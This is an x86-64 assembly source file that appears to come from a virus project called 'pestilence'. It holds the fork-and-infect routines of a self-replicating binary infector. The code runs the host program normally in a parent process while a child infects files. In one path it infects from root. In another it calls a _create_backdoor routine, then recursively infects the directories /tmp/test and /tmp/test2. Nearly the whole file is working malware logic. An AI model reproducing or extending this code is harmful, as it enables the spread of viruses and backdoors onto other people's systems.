%define FORK_S
%include "pestilence.lst"

section .text
	global _thread_create
    global _fork_before_exec_normaly
	global _fork_before_infect_root

; here we fork our program, and then execute an infected binary
_thread_create: ;void thread_create(not used, char *directory_to_infect, char *binary_path)
	enter 0, 0
	mov rax, 0
	push rax ; push the NULL pointer at the end of arguments
	push rsi ; push the directory to infect (argv[2])
	lea rax, [rel _verif]
	push rax ; push the code to let the binary know that we need to only run the infection part (argv[1])
	push rdx ; push file path (argv[0])
	mov rax, SYS_FORK
	syscall ; fork
	cmp rax, 0 ; check the return of fork: 0 is child, other is parent
	jne _parent_ret
; Here we are in the child process
	mov rax, 3
	mov rdi, 1
	syscall
	mov rax, 3
	mov rdi, 2
	syscall
	mov rax, 3
	mov rdi, 0
	syscall
	mov rax, SYS_EXECVE ; execve(char *filename, char *argv[], char *envp)
	mov rdi, QWORD [rsp] ; the file name is the last address we pushed on stack
	mov rsi, rsp ; we have our 3 address on stack, so we just mov our stack pointer for the arguments
	xor rdx, rdx ; we don't need env variables...
	syscall ; then the process is executed

_parent_ret:
	pop rdi
	pop rdi
	pop rdi
	pop rdi
	leave
	ret

_fork_before_infect_root:
;; When we infect from root, we always fork the process, run it normally in the parent,
;; and infect from root in the child
    ;; fork
	mov rax, SYS_FORK
	syscall
	cmp rax, 0
    jne _exit_properly ;; parent

    ;; child
    lea rdi, [rel _exit_properly]
    jmp _infect_from_root

_fork_before_exec_normaly:
;; When infecting normaly, we fork the process to run it normally in parent,
;; and infect in child
    ;; fork
	call _create_backdoor
	mov rax, SYS_FORK
	syscall
	cmp rax, 0
    jne _verify_o_entry ;; parent

    ;;child
    lea rdi, [rel _exit_properly]
	mov		rax, 0
	push	rax
	push	rax
	mov		rax, 0x747365742f706d74			; %rax = "tmp/test"
	push	rax								; push infection path on stack
	mov		rdi, rsp
	mov		rsi, rsp
	add		rsi, 16
	mov		rax, 1							; sets recursive infection
	push	rax
	push	rsi
	push	rdi
	call	_read_dir						; call our directory browsing function
	mov		BYTE [rsp + 32], 0x32			; add a '2' at the end of the path string
	call	_read_dir						; call our directory browsing function
	jmp _exit_properly

%undef FORK_S
